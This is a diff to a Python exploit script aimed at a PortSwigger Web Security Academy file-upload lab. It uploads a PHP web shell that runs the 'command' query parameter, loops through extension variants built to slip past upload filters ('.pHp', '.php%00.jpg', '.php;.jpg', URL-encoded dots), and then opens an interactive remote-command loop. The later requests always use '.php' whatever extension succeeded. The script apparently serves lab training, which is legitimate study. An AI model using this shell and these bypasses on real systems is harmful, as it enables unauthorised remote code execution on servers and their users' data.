@@ -78,7 +78,7 @@ def GET_myaccount(session: str) -> http.client.HTTPResponse:
     return connection.getresponse()
 
 
-def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResponse:
+def POST_myaccount_avatar_shell(csrf: str, session: str, extension: str) -> http.client.HTTPResponse:
     method, path = 'POST', '/my-account/avatar'
     host, port = f'{LAB_ID}.web-security-academy.net', 443
     headers = {
@@ -101,7 +101,7 @@ def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResp
     }
     files = {
         'avatar': {
-            'filename': 'shell.php',
+            'filename': f'shell{extension}',
             'content_type': 'application/x-httpd-php',
             'content': """<?php echo system($_GET['command']); ?>""",
         },
@@ -125,16 +125,15 @@ def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResp
     return connection.getresponse()
 
 
-def GET_files_avatars_shell_php(command: str) -> http.client.HTTPResponse:
+def GET_files_avatars_shell_php(command: str, extension: str) -> http.client.HTTPResponse:
     params = {'command': command}
-    method, path = 'GET', f'/files/avatars/shell.php?{urllib.parse.urlencode(params)}'
+    method, path = 'GET', f'/files/avatars/shell{extension}?{urllib.parse.urlencode(params)}'
     host, port = f'{LAB_ID}.web-security-academy.net', 443
     headers = {
-        'accept': 'image/avif,image/webp,*/*',
+        'accept': '*/*',
         'accept-language': 'en-US,en;q=0.5',
         'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
         'cookie': f'session={session}',
-        'sec-fetch-dest': 'image',
         'sec-fetch-mode': 'no-cors',
         'sec-fetch-site': 'same-origin',
         'te': 'trailers',
@@ -169,8 +168,39 @@ session = login_session()
 print("logged in.")
 print(f"session: {session}")
 csrf = file_upload_csrf(session)
-POST_myaccount_avatar_shell(csrf, session)
-print("got shell.")
-while True:
-    command = input("insert command: ")
-    print(GET_files_avatars_shell_php(command).read().decode('utf-8'))
+
+extensions = [
+    '.php',
+    '.pHp',
+    '.PHP',
+    '.phphp',
+    '.php.jpg',
+    '.jpg.php',
+    '.php.',
+    '.php ',
+    '.php;.jpg',
+    '.php%00.jpg',
+    '%2Ephp',
+    '%252Ephp',
+]
+found_extension = None
+for extension in extensions:
+    response = POST_myaccount_avatar_shell(csrf, session, extension)
+    print(f"POST avatar response status: {response.status} for extension: {extension}")
+    if response.status != 200:
+        continue
+    get_response = GET_files_avatars_shell_php('ls', '.php')
+    if get_response.status != 200:
+        continue
+    get_response_body = get_response.read().decode('utf-8').lower()
+    if 'not found' in get_response_body or 'php echo' in get_response_body:
+        continue
+    found_extension = extension
+    break
+
+
+if found_extension:
+    print("got shell.")
+    while True:
+        command = input("insert command: ")
+        print(GET_files_avatars_shell_php(command, '.php').read().decode('utf-8'))
